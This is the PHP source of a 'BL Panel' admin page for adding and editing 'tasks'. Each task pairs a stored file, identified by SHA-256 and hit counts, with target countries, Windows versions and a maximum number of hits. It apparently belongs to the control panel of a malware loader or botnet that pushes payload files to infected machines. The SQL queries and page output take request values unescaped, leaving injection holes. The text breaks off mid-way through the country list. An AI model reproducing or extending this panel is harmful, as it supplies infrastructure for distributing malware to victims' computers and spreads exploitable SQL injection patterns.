<?php
include("config.php");
include('checklogin.php');

if(isset($_POST['add_task'])){
	$name = $_POST['name'];
	$priority = $_POST['priority'];
	$countries_array = $_POST['countries']; //array
	$windows_array = $_POST['windows']; //array
	$file = $_POST['file'];
	$max_hits = $_POST['mhits'];
	$countries = implode(",", $countries_array);
	$windows = implode(",", $windows_array);
	$sql = mysqli_query($conn, "INSERT INTO tasks (name, priority, file, countries, windows, hits, max) VALUES ('$name', '$priority', '$file', '$countries', '$windows', '0', '$max_hits')");
    echo "Task added \n";
}
if(isset($_GET['edit'])){
	$sql = mysqli_query($conn, "SELECT id, name, priority, file, countries, windows, hits, max FROM tasks WHERE id='".$_GET['edit']."'");
	$re = mysqli_fetch_assoc($sql);
	$countries_array = explode(",", $re['countries']);
	$windows_array = explode(",", $re['windows']);
}

if(isset($_POST['edit_task'])){
	$task_id = $_GET['edit'];
	$name = $_POST['name'];
	$priority = $_POST['priority'];
	$countries_array = $_POST['countries']; //array
	$windows_array = $_POST['windows']; //array
	$file = $_POST['file'];
	$max_hits = $_POST['mhits'];
	$countries = implode(",", $countries_array);
	$windows = implode(",", $windows_array);
	$sql = mysqli_query($conn, "UPDATE tasks SET name='$name', priority='$priority', file='$file', countries='$countries', windows='$windows', max='$max_hits' WHERE id='$task_id'");
	//$sql = mysqli_query($conn, "INSERT INTO tasks (name, priority, file, countries, windows, hits, max) VALUES ('$name', '$priority', '$file', '$countries', '$windows', '0', '$max_hits')");
    echo "Task updated \n";
	echo "<script>";
	echo "window.onload = function() {"."\n";
    echo "if(!window.location.hash) {"."\n";
    echo "window.location = window.location + '#loaded';"."\n";
    echo "window.location.reload();"."\n";
    echo "} }"."\n";
	echo "</script>";
}

$sql_file = mysqli_query($conn, "SELECT id,name,sha256,hits FROM files ORDER BY id");

?>


<html>
<head>
<title> BL Panel </title>
<link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
<link href="inc/multiple-select.css" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="inc/jquery.multiple.select.js"></script>
<script>
        $(function() { 
            $("#select3").multipleSelect({
                isopen: false,
                multiple: true,
                multipleWidth: 200
            });
        });
        $(function() { 
            $("#select4").multipleSelect({
                isopen: false,
                multiple: true,
                multipleWidth: 200
            });
        });
</script>
<style>
.demo { width:300px;}
</style>

<style>
@import url('https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700');

$base-spacing-unit: 24px;
$half-spacing-unit: $base-spacing-unit / 2;

$color-alpha: #1772FF;
$color-form-highlight: #EEEEEE;

*, *:before, *:after {
	box-sizing:border-box;
}

body {
	padding:$base-spacing-unit;
	font-family:'Source Sans Pro', sans-serif;
	margin:0;
}

h1,h2,h3,h4,h5,h6 {
	margin:0;
}

#image-surround { 
   display: inline-block;
   width: 8%;
}

#image-icon{
	display: inline-block;
	width: 2%;
}

h1 { 
   display: inline-block;
}

#utf a:link {
  color: #000000;
}

#utf a:visited {
  color: #000000;
}

#utf a:hover {
  color: #e60000;
}

#utf a:active {
  color: #000000;
}

.side {
	position: absolute;
	max-width: 5%;
	top: 5%;
	left: 2%;
}

.side button {
  background-color: #000000; 
  border: none;
  color: white;
  width: 50px;
  height: 50px;
  padding: 10px 10px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
}

.container {
	max-width: 1000px;
	margin-right:auto;
	margin-left:auto;
	display:flex;
	justify-content:center;
	align-items:center;
	min-height:60%;
}

.container input {
   margin-right: 20px;
}

.table {
	width:100%;
	border:1px solid $color-form-highlight;
}

.table-header {
	display:flex;
	width:100%;
	background:#000;
	padding:($half-spacing-unit * 1.5) 0;
}

.table-row {
	display:flex;
	width:100%;
	padding:($half-spacing-unit * 1.5) 0;

	&:nth-of-type(odd) {
		background:$color-form-highlight;
	}
}

.table-data, .header__item {
	flex: 1 1 20%;
	text-align:center;
}

.header__item {
	text-transform:uppercase;
}

.button {
  background-color: #000000;
  border: none;
  color: white;
  padding: 15px 32px;
  width: 20%;
  margin-right:auto;
  margin-left:auto;
  text-align: center;
  text-decoration: none;
  display: block;
  font-size: 16px;
}


.filter__link {
	color:white;
	text-decoration: none;
	position:relative;
	display:inline-block;
	padding-left:$base-spacing-unit;
	padding-right:$base-spacing-unit;

	&::after {
		content:'';
		position:absolute;
		right:-($half-spacing-unit * 1.5);
		color:white;
		font-size:$half-spacing-unit;
		top: 50%;
		transform: translateY(-50%);
	}

	&.desc::after {
		content: '(desc)';
	}

	&.asc::after {
		content: '(asc)';
	}

}
</style>
<script>
function openInNewTab(url) {
  var win = window.open(url, '_blank');
  win.focus();
}
</script>
</head>
<body>
<center>
<img id="image-surround" src="inc/image.png" alt="" />
<h1> BL Panel </h1>
<img id="image-surround" src="inc/image.png" alt="" />
<br>
<h2> Add new task </h2>
<a href="admin.php">(Go Back)</a>
</center>

<div class="side">
<button title="Stats" onclick="openInNewTab('s.php');"> &#9873; </button><br><br>
<button title="Log Out" onclick="location.href='logout.php';"> &#10094; </button><br>
</div>

<div class="container">
<table>
<form action="" method="post">
<tr><td>Task name: </td><td><input name="name" size="11" type="text" value="<?php if(isset($_GET['edit'])){echo $re['name'];} ?>"/></td></tr>
<tr><td>Task priority: </td><td><input name="priority" min="1" max="100" size="2" type="number" value="<?php if(isset($_GET['edit'])){echo $re['priority'];} else {echo '10';} ?>" /></td></tr>
<tr><td>Countries: </td><td>
<select id="select3" class="demo" name="countries[]" multiple>
   <option value="ALL" <?php if(!isset($_GET['edit']) or in_array("ALL", $countries_array)){echo 'selected';} ?>>ALL COUNTRIES</option>
   <option value="AF" <?php if(isset($_GET['edit']) && in_array("AF", $countries_array)){echo 'selected';} ?>>Afghanistan</option>
   <option value="AL" <?php if(isset($_GET['edit']) && in_array("AL", $countries_array)){echo 'selected';} ?>>Albania</option>
   <option value="DZ" <?php if(isset($_GET['edit']) && in_array("DZ", $countries_array)){echo 'selected';} ?>>Algeria</option>
   <option value="AS" <?php if(isset($_GET['edit']) && in_array("AS", $countries_array)){echo 'selected';} ?>>American Samoa</option>
   <option value="AD" <?php if(isset($_GET['edit']) && in_array("AD", $countries_array)){echo 'selected';} ?>>Andorra</option>
   <option value="AO" <?php if(isset($_GET['edit']) && in_array("AO", $countries_array)){echo 'selected';} ?>>Angola</option>
   <option value="AI" <?php if(isset($_GET['edit']) && in_array("AI", $countries_array)){echo 'selected';} ?>>Anguilla</option>
   <option value="AG" <?php if(isset($_GET['edit']) && in_array("AG", $countries_array)){echo 'selected';} ?>>Antigua & Barbuda</option>
   <option value="AR" <?php if(isset($_GET['edit']) && in_array("AR", $countries_array)){echo 'selected';} ?>>Argentina</option>
   <option value="AM" <?php if(isset($_GET['edit']) && in_array("AM", $countries_array)){echo 'selected';} ?>>Armenia</option>
   <option value="AW" <?php if(isset($_GET['edit']) && in_array("AW", $countries_array)){echo 'selected';} ?>>Aruba</option>
   <option value="AU" <?php if(isset($_GET['edit']) && in_array("AU", $countries_array)){echo 'selected';} ?>>Australia</option>
   <option value="AT" <?php if(isset($_GET['edit']) && in_array("AT", $countries_array)){echo 'selected';} ?>>Austria</option>
   <option value="AZ" <?php if(isset($_GET['edit']) && in_array("AZ", $countries_array)){echo 'selected';} ?>>Azerbaijan</option>
   <option value="BS" <?php if(isset($_GET['edit']) && in_array("BS", $countries_array)){echo 'selected';} ?>>Bahamas</option>
   <option value="BH" <?php if(isset($_GET['edit']) && in_array("BH", $countries_array)){echo 'selected';} ?>>Bahrain</option>
   <option value="BD" <?php if(isset($_GET['edit']) && in_array("BD", $countries_array)){echo 'selected';} ?>>Bangladesh</option>
   <option value="BB" <?php if(isset($_GET['edit']) && in_array("BB", $countries_array)){echo 'selected';} ?>>Barbados</option>
   <option value="BY" <?php if(isset($_GET['edit']) && in_array("BY", $countries_array)){echo 'selected';} ?>>Belarus</option>
   <option value="BE" <?php if(isset($_GET['edit']) && in_array("BE", $countries_array)){echo 'selected';} ?>>Belgium</option>
   <option value="BZ" <?php if(isset($_GET['edit']) && in_array("BZ", $countries_array)){echo 'selected';} ?>>Belize</option>
   <option value="BJ" <?php if(isset($_GET['edit']) && in_array("BJ", $countries_array)){echo 'selected';} ?>>Benin</option>
   <option value="BM" <?php if(isset($_GET['edit']) && in_array("BM", $countries_array)){echo 'selected';} ?>>Bermuda</option>
   <option value="BT" <?php if(isset($_GET['edit']) && in_array("BT", $countries_array)){echo 'selected';} ?>>Bhutan</option>
   <option value="BO" <?php if(isset($_GET['edit']) && in_array("BO", $countries_array)){echo 'selected';} ?>>Bolivia</option>
   <option value="BQ" <?php if(isset($_GET['edit']) && in_array("BQ", $countries_array)){echo 'selected';} ?>>Bonaire</option>
   <option value="BA" <?php if(isset($_GET['edit']) && in_array("BA", $countries_array)){echo 'selected';} ?>>Bosnia & Herzegovina</option>
   <option value="BW" <?php if(isset($_GET['edit']) && in_array("BW", $countries_array)){echo 'selected';} ?>>Botswana</option>
   <option value="BR" <?php if(isset($_GET['edit']) && in_array("BR", $countries_array)){echo 'selected';} ?>>Brazil</option>
   <option value="IO" <?php if(isset($_GET['edit']) && in_array("IO", $countries_array)){echo 'selected';} ?>>British Indian Ocean Ter</option>
   <option value="BN" <?php if(isset($_GET['edit']) && in_array("BN", $countries_array)){echo 'selected';} ?>>Brunei</option>
   <option value="BG" <?php if(isset($_GET['edit']) && in_array("BG", $countries_array)){echo 'selected';} ?>>Bulgaria</option>
   <option value="BF" <?php if(isset($_GET['edit']) && in_array("BF", $countries_array)){echo 'selected';} ?>>Burkina Faso</option>
   <option value="BI" <?php if(isset($_GET['edit']) && in_array("BI", $countries_array)){echo 'selected';} ?>>Burundi</option>
   <option value="KH" <?php if(isset($_GET['edit']) && in_array("KH", $countries_array)){echo 'selected';} ?>>Cambodia</option>
   <option value="CM" <?php if(isset($_GET['edit']) && in_array("CM", $countries_array)){echo 'selected';} ?>>Cameroon</option>
   <option value="CA" <?php if(isset($_GET['edit']) && in_array("CA", $countries_array)){echo 'selected';} ?>>Canada</option>
   <option value="CV" <?php if(isset($_GET['edit']) && in_array("CV", $countries_array)){echo 'selected';} ?>>Cape Verde</option>
   <option value="KY" <?php if(isset($_GET['edit']) && in_array("KY", $countries_array)){echo 'selected';} ?>>Cayman Islands</option>
   <option value="CF" <?php if(isset($_GET['edit']) && in_array("CF", $countries_array)){echo 'selected';} ?>>Central African Republic</option>
   <option value="TD" <?php if(isset($_GET['edit']) && in_array("TD", $countries_array)){echo 'selected';} ?>>Chad</option>
   <option value="CL" <?php if(isset($_GET['edit']) && in_array("CL", $countries_array)){echo 'selected';} ?>>Chile</option>
   <option value="CN" <?php if(isset($_GET['edit']) && in_array("CN", $countries_array)){echo 'selected';} ?>>China</option>
   <option value="CX" <?php if(isset($_GET['edit']) && in_array("CX", $countries_array)){echo 'selected';} ?>>Christmas Island</option>
   <option value="CC" <?php if(isset($_GET['edit']) && in_array("CC", $countries_array)){echo 'selected';} ?>>Cocos Island</option>
   <option value="CO" <?php if(isset($_GET['edit']) && in_array("CO", $countries_array)){echo 'selected';} ?>>Colombia</option>
   <option value="KM" <?php if(isset($_GET['edit']) && in_array("KM", $countries_array)){echo 'selected';} ?>>Comoros</option>
   <option value="CD" <?php if(isset($_GET['edit']) && in_array("CD", $countries_array)){echo 'selected';} ?>>Congo</option>
   <option value="CK" <?php if(isset($_GET['edit']) && in_array("CK", $countries_array)){echo 'selected';} ?>>Cook Islands</option>
   <option value="CR" <?php if(isset($_GET['edit']) && in_array("CR", $countries_array)){echo 'selected';} ?>>Costa Rica</option>
   <option value="CI" <?php if(isset($_GET['edit']) && in_array("CI", $countries_array)){echo 'selected';} ?>>Cote DIvoire</option>
   <option value="HR" <?php if(isset($_GET['edit']) && in_array("HR", $countries_array)){echo 'selected';} ?>>Croatia</option>
   <option value="CU" <?php if(isset($_GET['edit']) && in_array("CU", $countries_array)){echo 'selected';} ?>>Cuba</option>
   <option value="CW" <?php if(isset($_GET['edit']) && in_array("CW", $countries_array)){echo 'selected';} ?>>Curacao</option>
   <option value="CY" <?php if(isset($_GET['edit']) && in_array("CY", $countries_array)){echo 'selected';} ?>>Cyprus</option>
   <option value="CZ" <?php if(isset($_GET['edit']) && in_array("CZ", $countries_array)){echo 'selected';} ?>>Czech Republic</option>
   <option value="DK" <?php if(isset($_GET['edit']) && in_array("DK", $countries_array)){echo 'selected';} ?>>Denmark</option>
   <option value="DJ" <?php if(isset($_GET['edit']) && in_array("DJ", $countries_array)){echo 'selected';} ?>>Djibouti</option>
   <option value="DM" <?php if(isset($_GET['edit']) && in_array("DM", $countries_array)){echo 'selected';} ?>>Dominica</option>
   <option value="DO" <?php if(isset($_GET['edit']) && in_array("DO", $countries_array)){echo 'selected';} ?>>Dominican Republic</option>
   <option value="EC" <?php if(isset($_GET['edit']) && in_array("EC", $countries_array)){echo 'selected';} ?>>Ecuador</option>
   <option value="EG" <?php if(isset($_GET['edit']) && in_array("EG", $countries_array)){echo 'selected';} ?>>Egypt</option>
   <option value="SV" <?php if(isset($_GET['edit']) && in_array("SV", $countries_array)){echo 'selected';} ?>>El Salvador</option>
   <option value="GQ" <?php if(isset($_GET['edit']) && in_array("GQ", $countries_array)){echo 'selected';} ?>>Equatorial Guinea</option>
   <option value="ER" <?php if(isset($_GET['edit']) && in_array("ER", $countries_array)){echo 'selected';} ?>>Eritrea</option>
   <option value="EE" <?php if(isset($_GET['edit']) && in_array("EE", $countries_array)){echo 'selected';} ?>>Estonia</option>
   <option value="ET" <?php if(isset($_GET['edit']) && in_array("ET", $countries_array)){echo 'selected';} ?>>Ethiopia</option>
   <option value="FK" <?php if(isset($_GET['edit']) && in_array("FK", $countries_array)){echo 'selected';} ?>>Falkland Islands</option>
   <option value="FO" <?php if(isset($_GET['edit']) && in_array("FO", $countries_array)){echo 'selected';} ?>>Faroe Islands</option>
   <option value="FJ" <?php if(isset($_GET['edit']) && in_array("FJ", $countries_array)){echo 'selected';} ?>>Fiji</option>
   <option value="FI" <?php if(isset($_GET['edit']) && in_array("FI", $countries_array)){echo 'selected';} ?>>Finland</option>
   <option value="FR" <?php if(isset($_GET['edit']) && in_array("FR", $countries_array)){echo 'selected';} ?>>France</option>
   <option value="GF" <?php if(isset($_GET['edit']) && in_array("GF", $countries_array)){echo 'selected';} ?>>French Guiana</option>
   <option value="PF" <?php if(isset($_GET['edit']) && in_array("PF", $countries_array)){echo 'selected';} ?>>French Polynesia</option>
   <option value="TF" <?php if(isset($_GET['edit']) && in_array("TF", $countries_array)){echo 'selected';} ?>>French Southern Ter</option>
   <option value="GA" <?php if(isset($_GET['edit']) && in_array("GA", $countries_array)){echo 'selected';} ?>>Gabon</option>
   <option value="GM" <?php if(isset($_GET['edit']) && in_array("GM", $countries_array)){echo 'selected';} ?>>Gambia</option>
   <option value="GE" <?php if(isset($_GET['edit']) && in_array("GE", $countries_array)){echo 'selected';} ?>>Georgia</option>
   <option value="DE" <?php if(isset($_GET['edit']) && in_array("DE", $countries_array)){echo 'selected';} ?>>Germany</option>
   <option value="GH" <?php if(isset($_GET['edit']) && in_array("GH", $countries_array)){echo 'selected';} ?>>Ghana</option>
   <option value="GI" <?php if(isset($_GET['edit']) && in_array("GI", $countries_array)){echo 'selected';} ?>>Gibraltar</option>
   <option value="GR" <?php if(isset($_GET['edit']) && in_array("GR", $countries_array)){echo 'selected';} ?>>Greece</option>
   <option value="GL" <?php if(isset($_GET['edit']) && in_array("GL", $countries_array)){echo 'selected';} ?>>Greenland</option>
   <option value="GD" <?php if(isset($_GET['edit']) && in_array("GD", $countries_array)){echo 'selected';} ?>>Grenada</option>
   <option value="GP" <?php if(isset($_GET['edit']) && in_array("GP", $countries_array)){echo 'selected';} ?>>Guadeloupe</option>
   <option value="GU" <?php if(isset($_GET['edit']) && in_array("GU", $countries_array)){echo 'selected';} ?>>Guam</option>
   <option value="GT" <?php if(isset($_GET['edit']) && in_array("GT", $countries_array)){echo 'selected';} ?>>Guatemala</option>
   <option value="GN" <?php if(isset($_GET['edit']) && in_array("GN", $countries_array)){echo 'selected';} ?>>Guinea</option>
   <option value="GY" <?php if(isset($_GET['edit']) && in_array("GY", $countries_array)){echo 'selected';} ?>>Guyana</option>
   <option value="HT" <?php if(isset($_GET['edit']) && in_array("HT", $countries_array)){echo 'selected';} ?>>Haiti</option>
   <option value="HN" <?php if(isset($_GET['edit']) && in_array("HN", $countries_array)){echo 'selected';} ?>>Honduras</option>
   <option value="HK" <?php if(isset($_GET['edit']) && in_array("HK", $countries_array)){echo 'selected';} ?>>Hong Kong</option>
   <option value="HU" <?php if(isset($_GET['edit']) && in_array("HU", $countries_array)){echo 'selected';} ?>>Hungary</option>
   <option value="IS" <?php if(isset($_GET['edit']) && in_array("IS", $countries_array)){echo 'selected';} ?>>Iceland</option>
   <option value="ID" <?php if(isset($_GET['edit']) && in_array("ID", $countries_array)){echo 'selected';} ?>>Indonesia</option>
   <option value="IN" <?php if(isset($_GET['edit']) && in_array("IN", $countries_array)){echo 'selected';} ?>>India</option>
   <option value="IR" <?php if(isset($_GET['edit']) && in_array("IR", $countries_array)){echo 'selected';} ?>>Iran</option>
   <option value="IQ" <?php if(isset($_GET['edit']) && in_array("IQ", $countries_array)){echo 'selected';} ?>>Iraq</option>
   <option value="IE" <?php if(isset($_GET['edit']) && in_array("IE", $countries_array)){echo 'selected';} ?>>Ireland</option>
   <option value="IM" <?php if(isset($_GET['edit']) && in_array("IM", $countries_array)){echo 'selected';} ?>>Isle of Man</option>
   <option value="IL" <?php if(isset($_GET['edit']) && in_array("IL", $countries_array)){echo 'selected';} ?>>Israel</option>
   <option value="IT" <?php if(isset($_GET['edit']) && in_array("IT", $countries_array)){echo 'selected';} ?>>Italy</option>
   <option value="JM" <?php if(isset($_GET['edit']) && in_array("JM", $countries_array)){echo 'selected';} ?>>Jamaica</option>
   <option value="JP" <?php if(isset($_GET['edit']) && in_array("JP", $countries_array)){echo 'selected';} ?>>Japan</option>
   <option value="JO" <?php if(isset($_GET['edit']) && in_array("JO", $countries_array)){echo 'selected';} ?>>Jordan</option>
   <option value="KZ" <?php if(isset($_GET['edit']) && in_array("KZ", $countries_array)){echo 'selected';} ?>>Kazakhstan</option>
   <option value="KE" <?php if(isset($_GET['edit']) && in_array("KE", $countries_array)){echo 'selected';} ?>>Kenya</option>
   <option value="KI" <?php if(isset($_GET['edit']) && in_array("KI", $countries_array)){echo 'selected';} ?>>Kiribati</option>
   <option value="KP" <?php if(isset($_GET['edit']) && in_array("KP", $countries_array)){echo 'selected';} ?>>Korea North</option>
   <option value="KR" <?php if(isset($_GET['edit']) && in_array("KR", $countries_array)){echo 'selected';} ?>>Korea South</option>
   <option value="KW" <?php if(isset($_GET['edit']) && in_array("KW", $countries_array)){echo 'selected';} ?>>Kuwait</option>
   <option value="KG" <?php if(isset($_GET['edit']) && in_array("KG", $countries_array)){echo 'selected';} ?>>Kyrgyzstan</option>
   <option value="LA" <?php if(isset($_GET['edit']) && in_array("LA", $countries_array)){echo 'selected';} ?>>Laos</option>
   <option value="LV" <?php if(isset($_GET['edit']) && in_array("LV", $countries_array)){echo 'selected';} ?>>Latvia</option>
   <option value="LB" <?php if(isset($_GET['edit']) && in_array("LB", $countries_array)){echo 'selected';} ?>>Lebanon</option>
   <option value="LS" <?php if(isset($_GET['edit']) && in_array("LS", $countries_array)){echo 'selected';} ?>>Lesotho</option>
   <option value="LR" <?php if(isset($_GET['edit']) && in_array("LR", $countries_array)){echo 'selected';} ?>>Liberia</option>
   <option value="LY" <?php if(isset($_GET['edit']) && in_array("LY", $countries_array)){echo 'selected';} ?>>Libya</option>
   <option value="LI" <?php if(isset($_GET['edit']) && in_array("LI", $countries_array)){echo 'selected';} ?>>Liechtenstein</option>
   <option value="LT" <?php if(isset($_GET['edit']) && in_array("LT", $countries_array)){echo 'selected';} ?>>Lithuania</option>
   <option value="LU" <?php if(isset($_GET['edit']) && in_array("LU", $countries_array)){echo 'selected';} ?>>Luxembourg</option>
   <option value="MO" <?php if(isset($_GET['edit']) && in_array("MO", $countries_array)){echo 'selected';} ?>>Macau</option>
   <option value="MK" <?php if(isset($_GET['edit']) && in_array("MK", $countries_array)){echo 'selected';} ?>>Macedonia</option>
   <option value="MG" <?php if(isset($_GET['edit']) && in_array("MG", $countries_array)){echo 'selected';} ?>>Madagascar</option>
   <option value="MY" <?php if(isset($_GET['edit']) && in_array("MY", $countries_array)){echo 'selected';} ?>>Malaysia</option>
   <option value="MW" <?php if(isset($_GET['edit']) && in_array("MW", $countries_array)){echo 'selected';} ?>>Malawi</option>
   <option value="MV" <?php if(isset($_GET['edit']) && in_array("MV", $countries_array)){echo 'selected';} ?>>Maldives</option>
   <option value="ML" <?php if(isset($_GET['edit']) && in_array("ML", $countries_array)){echo 'selected';} ?>>Mali</option>
   <option value="MT" <?php if(isset($_GET['edit']) && in_array("MT", $countries_array)){echo 'selected';} ?>>Malta</option>
   <option value="MH" <?php if(isset($_GET['edit']) && in_array("MH", $countries_array)){echo 'selected';} ?>>Marshall Islands</option>
   <option value="MQ" <?php if(isset($_GET['edit']) && in_array("MQ", $countries_array)){echo 'selected';} ?>>Martinique</option>
   <option value="MR" <?php if(isset($_GET['edit']) && in_array("MR", $countries_array)){echo 'selected';} ?>>Mauritania</option>
   <option value="MU" <?php if(isset($_GET['edit']) && in_array("MU", $countries_array)){echo 'selected';} ?>>Mauritius</option>
   <option value="YT" <?php if(isset($_GET['edit']) && in_array("YT", $countries_array)){echo 'selected';} ?>>Mayotte</option>
   <option value="MX" <?php if(isset($_GET['edit']) && in_array("MX", $countries_array)){echo 'selected';} ?>>Mexico</option>
   <option value="MD" <?php if(isset($_GET['edit']) && in_array("MD", $countries_array)){echo 'selected';} ?>>Moldova</option>
   <option value="MC" <?php if(isset($_GET['edit']) && in_array("MC", $countries_array)){echo 'selected';} ?>>Monaco</option>
   <option value="MN" <?php if(isset($_GET['edit']) && in_array("MN", $countries_array)){echo 'selected';} ?>>Mongolia</option>
   <option value="MS" <?php if(isset($_GET['edit']) && in_array("MS", $countries_array)){echo 'selected';} ?>>Montserrat</option>
   <option value="ME" <?php if(isset($_GET['edit']) && in_array("ME", $countries_array)){echo 'selected';} ?>>Montenegro</option>
   <option value="MA" <?php if(isset($_GET['edit']) && in_array("MA", $countries_array)){echo 'selected';} ?>>Morocco</option>
   <option value="MZ" <?php if(isset($_GET['edit']) && in_array("MZ", $countries_array)){echo 'selected';} ?>>Mozambique</option>
   <option value="MM" <?php if(isset($_GET['edit']) && in_array("MM", $countries_array)){echo 'selected';} ?>>Myanmar</option>
   <option value="NA" <?php if(isset($_GET['edit']) && in_array("NA", $countries_array)){echo 'selected';} ?>>Namibia</option>
   <option value="NR" <?php if(isset($_GET['edit']) && in_array("NR", $countries_array)){echo 'selected';} ?>>Nauru</option>
   <option value="NP" <?php if(isset($_GET['edit']) && in_array("NP", $countries_array)){echo 'selected';} ?>>Nepal</option>
   <option value="NL" <?php if(isset($_GET['edit']) && in_array("NL", $countries_array)){echo 'selected';} ?>>Netherlands</option>
   <option value="NC" <?php if(isset($_GET['edit']) && in_array("NC", $countries_array)){echo 'selected';} ?>>New Caledonia</option>
   <option value="NZ" <?php if(isset($_GET['edit']) && in_array("NZ", $countries_array)){echo 'selected';} ?>>New Zealand</option>
   <option value="NI" <?php if(isset($_GET['edit']) && in_array("NI", $countries_array)){echo 'selected';} ?>>Nicaragua</option>
   <option value="NE" <?php if(isset($_GET['edit']) && in_array("NE", $countries_array)){echo 'selected';} ?>>Niger</option>
   <option value="NG" <?php if(isset($_GET['edit']) && in_array("NG", $countries_array)){echo 'selected';} ?>>Nigeria</option>
   <option value="NU" <?php if(isset($_GET['edit']) && in_array("NU", $countries_array)){echo 'selected';} ?>>Niue</option>
   <option value="NF" <?php if(isset($_GET['edit']) && in_array("NF", $countries_array)){echo 'selected';} ?>>Norfolk Island</option>
   <option value="NO" <?php if(isset($_GET['edit']) && in_array("NO", $countries_array)){echo 'selected';} ?>>Norway</option>
   <option value="OM" <?php if(isset($_GET['edit']) && in_array("OM", $countries_array)){echo 'selected';} ?>>Oman</option>
   <option value="PK" <?php if(isset($_GET['edit']) && in_array("PK", $countries_array)){echo 'selected';} ?>>Pakistan</option>
   <option value="PW" <?php if(isset($_GET['edit']) && in_array("PW", $countries_array)){echo 'selected';} ?>>Palau Island</option>
   <option value="PS" <?php if(isset($_GET['edit']) && in_array("PS", $countries_array)){echo 'selected';} ?>>Palestine</option>
   <option value="PA" <?php if(isset($_GET['edit']) && in_array("PA", $countries_array)){echo 'selected';} ?>>Panama</option>
   <option value="PG" <?php if(isset($_GET['edit']) && in_array("PG", $countries_array)){echo 'selected';} ?>>Papua New Guinea</option>
   <option value="PY" <?php if(isset($_GET['edit']) && in_array("PY", $countries_array)){echo 'selected';} ?>>Paraguay</option>
   <option value="PE" <?php if(isset($_GET['edit']) && in_array("PE", $countries_array)){echo 'selected';} ?>>Peru</option>
   <option value="PH" <?php if(isset($_GET['edit']) && in_array("PH", $countries_array)){echo 'selected';} ?>>Philippines</option>
   <option value="PN" <?php if(isset($_GET['edit']) && in_array("PN", $countries_array)){echo 'selected';} ?>>Pitcairn Island</option>
   <option value="PL" <?php if(isset($_GET['edit']) && in_array("PL", $countries_array)){echo 'selected';} ?>>Poland</option>
   <option value="PT" <?php if(isset($_GET['edit']) && in_array("PT", $countries_array)){echo 'selected';} ?>>Portugal</option>
   <option value="PR" <?php if(isset($_GET['edit']) && in_array("PR", $countries_array)){echo 'selected';} ?>>Puerto Rico</option>
   <option value="QA" <?php if(isset($_GET['edit']) && in_array("QA", $countries_array)){echo 'selected';} ?>>Qatar</option>
   <option value="RE" <?php if(isset($_GET['edit']) && in_array("RE", $countries_array)){echo 'selected';} ?>>Reunion</option>
   <option value="RO" <?php if(isset($_GET['edit']) && in_array("RO", $countries_array)){echo 'selected';} ?>>Romania</option>
   <option value="RU" <?php if(isset($_GET['edit']) && in_array("RU", $countries_array)){echo 'selected';} ?>>Russia</option>
   <option value="RW" <?php if(isset($_GET['edit']) && in_array("RW", $countries_array)){echo 'selected';} ?>>Rwanda</option>
   <option value="BL" <?php if(isset($_GET['edit']) && in_array("BL", $countries_array)){echo 'selected';} ?>>St Barthelemy</option>
   <option value="SH" <?php if(isset($_GET['edit']) && in_array("SH", $countries_array)){echo 'selected';} ?>>St Helena</option>
   <option value="KN" <?php if(isset($_GET['edit']) && in_array("KN", $countries_array)){echo 'selected';} ?>>St Kitts-Nevis</option>
   <option value="LC" <?php if(isset($_GET['edit']) && in_array("LC", $countries_array)){echo 'selected';} ?>>St Lucia</option>
   <option value="SX" <?php if(isset($_GET['edit']) && in_array("SX", $countries_array)){echo 'selected';} ?>>St Maarten</option>
   <option value="PM" <?php if(isset($_GET['edit']) && in_array("PM", $countries_array)){echo 'selected';} ?>>St Pierre & Miquelon</option>
   <option value="VC" <?php if(isset($_GET['edit']) && in_array("VC", $countries_array)){echo 'selected';} ?>>St Vincent & Grenadines</option>
   <option value="WS" <?php if(isset($_GET['edit']) && in_array("WS", $countries_array)){echo 'selected';} ?>>Samoa</option>
   <option value="SM" <?php if(isset($_GET['edit']) && in_array("SM", $countries_array)){echo 'selected';} ?>>San Marino</option>
   <option value="ST" <?php if(isset($_GET['edit']) && in_array("ST", $countries_array)){echo 'selected';} ?>>Sao Tome & Principe</option>
   <option value="SA" <?php if(isset($_GET['edit']) && in_array("SA", $countries_array)){echo 'selected';} ?>>Saudi Arabia</option>
   <option value="SN" <?php if(isset($_GET['edit']) && in_array("SN", $countries_array)){echo 'selected';} ?>>Senegal</option>
   <option value="RS" <?php if(isset($_GET['edit']) && in_array("RS", $countries_array)){echo 'selected';} ?>>Serbia</option>
   <option value="SC" <?php if(isset($_GET['edit']) && in_array("SC", $countries_array)){echo 'selected';} ?>>Seychelles</option>
   <option value="SL" <?php if(isset($_GET['edit']) && in_array("SL", $countries_array)){echo 'selected';} ?>>Sierra Leone</option>
   <option value="SG" <?php if(isset($_GET['edit']) && in_array("SG", $countries_array)){echo 'selected';} ?>>Singapore</option>
   <option value="SK" <?php if(isset($_GET['edit']) && in_array("SK", $countries_array)){echo 'selected';} ?>>Slovakia</option>
   <option value="SI" <?php if(isset($_GET['edit']) && in_array("SI", $countries_array)){echo 'selected';} ?>>Slovenia</option>
   <option value="SB" <?php if(isset($_GET['edit']) && in_array("SB", $countries_array)){echo 'selected';} ?>>Solomon Islands</option>
   <option value="SO" <?php if(isset($_GET['edit']) && in_array("SO", $countries_array)){echo 'selected';} ?>>Somalia</option>
   <option value="ZA" <?php if(isset($_GET['edit']) && in_array("ZA", $countries_array)){echo 'selected';} ?>>South Africa</option>
   <option value="ES" <?php if(isset($_GET['edit']) && in_array("ES", $countries_array)){echo 'selected';} ?>>Spain</option>
   <option value="LK" <?php if(isset($_GET['edit']) && in_array("LK", $countries_array)){echo 'selected';} ?>>Sri Lanka</option>
   <option value="SD" <?php if(isset($_GET['edit']) && in_array("SD", $countries_array)){echo 'selected';} ?>>Sudan</option>
   <option value="SR" <?php if(isset($_GET['edit']) && in_array("SR", $countries_array)){echo 'selected';} ?>>Suriname</option>
   <option value="SZ" <?php if(isset($_GET['edit']) && in_array("SZ", $countries_array)){echo 'selected';} ?>>Swaziland</option>
   <option value="SE" <?php if(isset($_GET['edit']) && in_array("SE", $countries_array)){echo 'selected';} ?>>Sweden</option>
   <option value="CH" <?php if(isset($_GET['edit']) && in_array("CH", $countries_array)){echo 'selected';} ?>>Switzerland</option>
   <option value="SY" <?php if(isset($_GET['edit']) && in_array("SY", $countries_array)){echo 'selected';} ?>>Syria</option>
